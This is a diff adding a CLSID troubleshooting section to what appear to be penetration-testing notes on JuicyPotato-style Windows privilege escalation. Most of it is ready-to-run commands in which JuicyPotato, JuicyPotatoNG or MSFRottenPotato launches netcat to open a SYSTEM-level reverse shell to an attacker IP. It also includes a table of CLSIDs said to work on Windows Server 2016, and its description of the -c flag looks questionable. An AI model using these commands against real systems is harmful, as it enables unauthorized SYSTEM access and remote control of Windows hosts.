@@ -44,3 +44,49 @@ xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a 
 .\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe  $IPattackingMachine 1234 -e cmd.exe" -t *
 ```
 
+## Troubleshooting CLSID
+
+- In Windows, a **CLSID** (Class ID) is a **unique identifier** (GUID format) for a **COM object**.
+- JuicyPotato (and similar exploits) work by abusing **specific COM services** that:
+    
+    - Run as SYSTEM
+    - Allow you (the user) to trigger them
+    - Are vulnerable to impersonation (they delegate their privileges poorly)
+        
+- If the COM service doesn't behave correctly (wrong CLSID), you get errors like `recv failed with error: 10038`.
+
+
+→ **So the choice of CLSID is critical**: **Some CLSIDs will work; others will not depending on your OS and what services are running.**
+
+
+### Which CLSIDs should you use on Windows Server 2016?
+
+Here are some CLSIDs often successful on Windows Server 2016:
+
+| CLSID                                    | Description          | Notes                        |
+| ---------------------------------------- | -------------------- | ---------------------------- |
+| `{3E5FC7F9-9A51-4367-9063-A120244FBEC7}` | `IObjectActivator`   | Very commonly works          |
+| `{4991d34b-80a1-4291-83b6-3328366b9097}` | `BITS`               | Might still work sometimes   |
+| `{d63e0ce2-a0a2-11d0-9c02-00c04fc99c8e}` | `PSFactoryBuffer`    | Good choice                  |
+| `{e60687f7-01a1-40aa-86ac-db1cbf673334}` | `ShellBrowserWindow` | Sometimes works              |
+| `{d20caec4-5ca8-4905-ae3b-bf251ea09b53}` | `ShellWindows`       | Works but unstable sometimes |
+
+
+```powershell
+.\JuicyPotatoNG.exe -p cmd.exe -a "/c your_payload" -t * -l 9999 -c
+
+# Example:
+.\JuicyPotato.exe -p c:\windows\system32\cmd.exe -a "/c C:\Users\Public\Documents\nc64-32.exe 10.10.15.146 1234 -e cmd.exe" -t * -l 9999 -c
+
+
+.\JuicyPotato.exe -p c:\windows\system32\cmd.exe -a "/c C:\Users\Public\Documents\nc64-32.exe 10.10.15.146 1234 -e cmd.exe" -c {3E5FC7F9-9A51-4367-9063-A120244FBEC7}
+
+.\JuicyPotato.exe -p c:\windows\system32\cmd.exe -a "C:\Users\Public\Documents\nc64-32.exe 10.10.15.146 1234 -e cmd.exe" -t * -l 9999 -c {3E5FC7F9-9A51-4367-9063-A120244FBEC7}
+
+.\MSFRottenPotato.exe -p c:\windows\system32\cmd.exe -a "/c C:\Users\Public\Documents\nc64-32.exe 10.10.15.146 1234 -e cmd.exe" -t * -l 9999 -c {d63e0ce2-a0a2-11d0-9c02-00c04fc99c8e}
+
+.\JuicyPotatoNG.exe -p c:\windows\system32\cmd.exe -a "/c C:\Users\Public\Documents\nc64-32.exe 10.10.15.146 1234 -e cmd.exe" -t * -b
+
+```
+
+where `-c` = **scan all CLSIDs** and find a working one automatically.
